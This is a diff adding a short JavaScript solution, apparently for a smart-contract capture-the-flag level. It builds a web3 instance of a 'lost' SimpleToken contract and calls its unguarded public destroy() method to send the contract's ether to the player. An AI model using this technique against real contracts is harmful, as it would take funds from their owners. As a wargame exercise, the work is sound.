@@ -1,0 +1,8 @@
+/* 
+	* Identify the contract created that hold the ethers by looking at the transactions of the instance 
+	* Copy the source from the "SimpleToken" contract into Remix and copy the JSON ABI
+	* Create contract instance from web3 and call the "destroy()" public method to recover the funds to your wallet
+*/ 
+abi = JSON.parse('[{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"address","name":"_creator","type":"address"},{"internalType":"uint256","name":"_initialSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address payable","name":"_to","type":"address"}],"name":"destroy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]')
+c = new web3.eth.Contract(abi, "0x124447dd6622DB60fEE9949A6d5262661aA4267c") // Replace with your "lost" contract address, which can be determined from the instance contract address see https://ethereum.stackexchange.com/questions/98700/find-address-of-a-contract-before-deployment-in-hardhat-and-ethers-js
+await c.methods.destroy(player).send({"from":player})
